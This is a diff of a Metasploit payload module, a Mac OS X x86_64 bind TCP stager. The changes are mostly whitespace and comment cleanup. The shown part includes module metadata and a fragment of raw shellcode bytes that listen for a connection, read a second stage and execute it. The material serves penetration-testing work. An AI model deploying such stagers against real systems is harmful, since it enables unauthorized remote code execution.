@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -12,30 +8,22 @@
 require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 
-###
-#
-# BindTcp
-# -------
-#
-# Mac OS X x86 bind TCP stager.
-#
-###
 module Metasploit3
 
 	include Msf::Payload::Stager
 
 	def initialize(info = { })
 		super(merge_info(info,
-			'Name'		=> 'Bind TCP Stager',
-			'Version'	=> '$Revision$',
-			'Description'	=> 'Listen, read length, read buffer, execute',
-			'Author'	=> 'nemo <nemo[at]felinemenace.org>',
-			'License'	=> MSF_LICENSE,
-			'Platform'	=> 'osx',
-			'Arch'		=> ARCH_X86_64,
-			'Handler'	=> Msf::Handler::BindTcp,
-			'Convention'	=> 'sockedi',
-			'Stager'	=>
+			'Name'        => 'Bind TCP Stager',
+			'Version'     => '$Revision$',
+			'Description' => 'Listen, read length, read buffer, execute',
+			'Author'      => 'nemo <nemo[at]felinemenace.org>',
+			'License'     => MSF_LICENSE,
+			'Platform'    => 'osx',
+			'Arch'        => ARCH_X86_64,
+			'Handler'     => Msf::Handler::BindTcp,
+			'Convention'  => 'sockedi',
+			'Stager'      =>
 			{
 				'Offsets' => { 'LPORT' => [ 31, 'n'] },
 				'Payload' =>
@@ -93,7 +81,7 @@ module Metasploit3
 					 "\x56" +                     # push rsi
 					 "\x4C\x89\xEF" +             # mov rdi,r13
 					 "\x48\x31\xC9" +             # xor rcx,rcx
-					 "\x4C\x89\xDA" + 	      # mov rdx,r11
+					 "\x4C\x89\xDA" +             # mov rdx,r11
 					 "\x4D\x31\xC0" +             # xor r8,r8
 					 "\x4D\x31\xD2" +             # xor r10,r10
 					 "\xB8\x1D\x00\x00\x02" +     # mov eax,0x200001d
